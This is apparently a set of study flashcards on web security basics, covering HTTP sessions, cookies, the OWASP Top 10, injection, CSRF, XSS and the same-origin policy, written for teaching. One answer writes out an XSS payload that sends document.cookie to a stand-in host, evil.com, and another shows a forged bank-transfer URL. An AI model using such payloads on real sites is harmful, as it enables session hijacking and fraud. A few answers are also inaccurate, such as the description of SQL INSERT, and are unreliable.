Topic	Question	Answer
Web Security: Basics	What are the possible HTTP requests? What does an HTTP response contain?	GET, POST, PUT, etc. \nA response contains a Status-line, e.g. HTTP/1.1 200 OK; zero or more header(General|Response|Entity) fields followed by CRLF; an empty line (i.e., a line with nothing preceding the CRLF) indicating the end of the header fields; optionally a message-body
Web Security: Basics	How is state managed in HTTP sessions? Is there any problem with that?	HTTP is stateless: when client sends a request, server sends back a response, but server does not hold any information on previous requests. The problem with that is that​ in most web applications a client has to access various pages before completing a specific task and the client state should be kept along all those pages.
Web Security: Basics	How does the server know if two requests come from the same browser?	The server inserts some token into the page when it is requested and gets that token passed back with the next request. For this there are two main approaches​ (to maintain session between web client and web server): Using hidden fields; and using cookies
Web Security: Basics	How do Hidden fields work? What are their advantages and disadvantages?	The idea is to include an HTML form with hidden fields containing session ID in all HTML pages sent to client. The hidden fields will be returned back to server in the request. For example,​ the web server can send a hidden HTML form field along with a unique session ID as follows: When the form is submitted, the specified name and value are automatically included in the GET or POST data. \nTheir advantage is that all browsers support HTML forms. Their disadvantages are that it requires careful and tedious programming effort, as pages behave to be dynamically generated to include this hidden field; and the session ends as soon as the browser is closed.
Web Security: Basics	How do Cookies work? What are they used for and what is their problem?	A cookie is a small piece of information that server sends to browser and gets stored inside the browser. It has a name, a value and other attributes such as domain, path, expiration date, version, comments. Browsers automatically include cookies in all subsequent requests to originating host of the cookie. Cookies are only sent back by browser to their originating host and not any other hosts. Domain and path specify server and path to return the cookie. Server can set cookie value to uniquely identify a client. \nCookies are commonly used for session and user management, as well as to hold personalised information, or to help in online sales/service (e.g. shopping cart). \nTheir main problem is that users may disable cookies in their browser.
Web Security: Basics	What are the security goals, and defences employed, in web security?	Web applications should provide the same security guarantees as those required for standalone applications. \n1. Visiting malicious website should not infect computer with malware or read and write files \nDefences: ​ Javascript sandboxed, aviod bugs in browser code, privilege separation, etc. \n2. Visiting malicious website (evil.com) should not compromise my session on other websites (gmail.com). Defences:​ same-origin policy - each website is isolated from all other websites. \nSensitive data stored on websites (gmail.com) should be protected.
Web Security: Basics	What are the kinds of web security attackers?	There are two kinds: \nWeb attacker: Controls malicious website (evil.com); has valid SSL/TLS certificates for evil.com; victim user visits evil.com (weaker). \nNetwork attacker: Controls the whole network; can intercept, craft, send messages (stronger).
Web Security: Basics	Name the OWASP Top 10 Web security flaws:	1. Injection \n2. Broken Authentication and Session Management \n3. Cross-Site Scripting (XSS) \n4. Insecure Direct Object References \n5. Security Misconfiguration \n6. Sensitive Data Exposure \n7. Missing Function Level Access Control \n8. Cross-Site Request Forgery \n9. Using Components with Known Vulnerabilities \n10. Unvalidated Redirects and Forwards
Web Security: Basics	Describe the first 5 Web security flaws: Injection, Broken Authentication and Session Management, Cross-Site Scripting (XSS), Insecure Direct Object References and Security Misconfiguration	1. Injection​ - (SQL, OS injection) Untrusted data is sent to interpreter as part of a command or query, tricking interpreter into executing uninteded commands and accessing data without authorisation \n2. Broken Authentication and Session Management​ - Compromising passwords, keys, session tokens or other flaws to assume other users identities due to not correctly implementing authentication and session management app functions.\n3. Cross-Site Scripting (XSS)​ - App takes untrusted data and sends it to a browser without validation or escaping, allowing attackers to execute scripts in victim browser, hijacking user sessions, defacing websites and redirecting to malicious websites. \n4. Insecure Direct Object References ​ - (direct object reference: dev exposes reference to internal implementation object, such as file, directory or database key) Manipulate references to access unauthorised data due to no access control check or other protections\n5. Security Misconfiguration ​ - taking advantage of not configuring security correctly. Due to failure to define & deploy secure configuration for the application, frameworks, app server, web server, db server and platform (default settings are often insecure); or not keeping software up to date.
Web Security: Basics	Describe the second 5 Web security flaws: Sensitive Data Exposure, Missing Function Level Access Control, Cross-Site Request Forgery, Using Components with Known Vulnerabilities and Unvalidated Redirects and Forwards	6. Sensitive Data Exposure​ - Stealing or modifying weakly protected data to conduct credit card fraud, identity theft and etc. Sensitive data requires encryption at rest and in transit, as well as precautions taken when exchanged with the browser. \n7. Missing Function Level Access Control ​ - Forging request to access functionality without authorisation due to inexistent verification for function level access rights.\n8. Cross-Site Request Forgery (CSRF)​ - Forces logged-on victims browser to send a forged HTTP request, including victims session cookie and other auth information, to vulnerable web app.\n9. Using Components with Known Vulnerabilities​ - Exploiting apps using components with known vulnerabilities, resulting in data loss or server takeover.\n10. Unvalidated Redirects and Forwards ​ - Redirecting victim to phishing/malware site or use forward to access unauthorized pages due to unproper validation when redirecting or forwarding users.
Web Security: Server-side attacks	What are injection attacks?	Injection flaws​ such as SQL, OS injection, occur when untrusted data is sent to interpreter as part of a command or query. This can trick interpreter into executing unintended commands and accessing data without authorisation. The two main attacks are command injection attacks and SQL injection attacks.
Web Security: Server-side attacks	Explain what Command Injections are and state the defenses against them. Additionally, give an example.	Injection is generally caused when data and code share the same channel: “Whois” is the code and the filename data and​ ‘;’ allows attacker to include new command. Defences include: input validation, input escaping and use of less powerful API. \nExample: service that prints result back from Linux program whois, invoked via URL like ​http://www.example.com/content.php?domain=google.com.
Web Security: Server-side attacks	How do Databases work with web servers? What is SQL and its most common commands?	Web server connects to DB server. Web server sends queries and commands according to incoming HTTP requests. DB server returns associated values. DB server can modify and update the records. \nSQL is most used DB query language. Its most commond commands are: \nSELECT - returns values of given field in specified table, for all records matching condition. \nINSERT - retrieves a set of records from DB and adds new record in specified table. \nDROP - deletes entire specified table. \n';' - enables separate commands
Web Security: Server-side attacks	Give an example of a SQL injection. What sort of defence is there for these kinds of attacks?	Web server logs in a user if user exists with the given username and pass. It sees if results exist, and if so logs in the user and redirects them to user control panel.\nDefence: create a template of SQL query, in which data values are substituted; ensures that untrusted value is not interpreted as a command.
Web Security: Client-side attacks	Explain the concept of Web browsers:	The main function of a browser is to​ present a chosen web resource by requesting it from the server and displaying it in browser window. Resources include: HTML documents, PDF files, images, other. The location of these resources are​ specified by user usign URI (Uniform Resource Identifier)
Web Security: Client-side attacks	What are the components of a browser?	See Figure 10.
Web Security: Client-side attacks	Explain the concept of the Document Object Model (DOM):	DOM is a programing interface for HTML, XML, SVG documents. It provides a structured representation of a document tree and defines how structure can be accessed from other programs for changing doc structure, style or content. DOM represents documents as structured groups of nodes and objects with properties and methods. Nodes can have event handlers attached, executing them once event is triggered. Essentially, it connects web pages to scripts or programming languages.
Web Security: Client-side attacks	Draw the DOM diagram:	See Figure 11.
Web Security: Client-side attacks	Give a few examples of using DOM:	"Displaying an alert message by using the alert() function from the window object: \n<body onload=""window.alert(’welcome to my page!’);""> \nDisplaying all the cookies associated with the current document in an alert message: \n<body onload=""window.alert(document.cookie);""> \nSending all the cookies associated with the current document to the evil.com server if x points to a non-existent image: \n<img src=x onerror=this.src=’http://evil.com/?c=’+document.cookie>"
Web Security: Client-side attacks	Explain the concept of session hijacking:	Session hijacking​, also known as cookie hijacking, exploits a valid computer session to gain unauthorized access to information or services in a computer system. Sessions can be hijacked in different ways. The most common are: \nCookie theft vulnerabilities: Predictable session tokens (Cookies should be unpredictable); HTTPS/HTTP: site has mixed HTTPS/HTTP pages, and token is sent over HTTP (set secure attr for session tokens, always issue a new session token on login); cross-site scripting (XSS) vulnerabilities \nCross-site request forgery (CSRF) vulnerabilities
Web Security: Client-side attacks	Explain the concept of Cross-site requrest forgery (CSRF):	CSRF forces user to execute unwanted actions on a web application in which they are currently authenticated. CSRF attacks target state-changing requests, not theft of data, since attacker has no way to see the response to the forged request.
Web Security: Client-side attacks	How does CSRF work in practise?	Attacker targets a user who has an account on a vulnerable server, builds an exploit URL and tricks the victim into making a request to the vulnerable server as if intentional. The attacker has two tools: ability to get the user to click the exploit link; and ability to have victim visit attackers server while logged-in to a vulnerable server. The key condition of this attack is that ​requests to vulnerable server have predictable structure.
Web Security: Client-side attacks	Give an example of a CSRF attack:	Alice wishes to transfer $100 to Bob using the bank.com web application. This money transfer operation reduces to a request like: GET ​ http://bank.com/transfer.do​?acct=BOB&amount=100 HTTP/1.1 \nThe bank.com server is vulnerable to CSRF: the attacker can generate a valid malicious request for Alice to execute!! The attack comprises the following steps: \n1. Eve crafts the following URL http://bank.com/transfer.do acct=Eve&amount=100000 \n2. When Alice visits Eve’s website she tricks Alice’s browser into accessing this URL
Web Security: Client-side attacks	What are CSRF's defences?	Checking the referrer​ header in the client’s HTTP request can prevent CSRF attacks. Ensuring that the HTTP request has come from the original site means that attacks from other sites will not function. \nInclude a secret in every link/form: Can use a hidden form field, custom HTTP header, or encode it directly in the URL; Must be unpredictable!; Can be same value as session token (cookie); Ruby on Rails embeds secrets in every link automatically
Web Security: Client-side attacks	How does Cross-site scripting (XSS) work?	The attacker's goal is to inject code into browser with the guise of conforming to same-origin policy: \nSite “evil.com” provides malicious script. \nAttacker tricks the vulnerable server (bank.com) to send attacker’s script to the user’s browser! \nVictim’s browser believes that the script’s origin is bank.com...because it does! \nMalicious script runs with bank.com’s access privileges
Web Security: Client-side attacks	What are the differences between Stored and Reflected XSS attacks?	Stored attacks: injected script is permanently stored on the target servers, eg. database, message forum, visitor log, comment field, etc. Victim retrieves the malicious script from the server when it requesting stored information. \nReflected attacks: injected script is reflected off the web server​, eg. error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web site. The key to reflected XSS attack is to find a good web server which will echo user input back in HTML response.
Web Security: Client-side attacks	What are the XSS's defences?	1. Escape/filter output: ​ escape dynamic data before inserting it into HTML \n2. Input validation: ​ check that inputs (headers, cookies, query strings, form fields, hidden fields) are of expected form (whitelisting) \n3. CSP: ​ server supplies a whitelist of the scripts that are allowed to appear on the page
Web Security: Client-side attacks	What problem does the Same-origin policy (SOP) tackle?	Assuming you are logged into Facebook and visit a malicious website in another browser tab, the SOP prevents JavaScript on that website from doing anything to your Facebook account that you are allowed to do through accessing the DOM associated with the Facebook page.
Web Security: Client-side attacks	How does the SOP work?	The SOP restricts how a document or script loaded from one origin (e.g. www.evil.com) can interact with a resource from another origin (e.g. www.bank.com). Each origin is kept isolated (sandboxed) from the rest of the web. The SOP is very important when it comes to protecting HTTP cookies (used to maintain authenticated user sessions)
Web Security: Client-side attacks	What is an origin in the SOP context?	An origin is defined by the​ scheme​, the host​ and the​ port​ of a URL. SOP restricts access to DOM of web resource to scripts loaded from same origin. Cross-origin access can be allowed using CORS (Cross Origin Resource Sharing): this is a mechanism that allows many resources (fonts, JavaScript, etc) on a web page, to be requested from another domain outside the domain from which the resource originated. Cross-site HTTP requests initiated from within scripts are subject to SOP restriction for security reason
Web Security: Client-side attacks	What is, and how does Javascript work?	JS is a powerful web page programming language. Scripts embedded in web pages are returned by the web server, and are executed by the browser. They can: alter page contents (DOM objects), track events (mouse clicks, motion, keystrokes), issue web requests and read replies, maintain persistent connections (AJAX), read and set cookies. The HTML <script> elements can execute content retrieved from foreign origins.
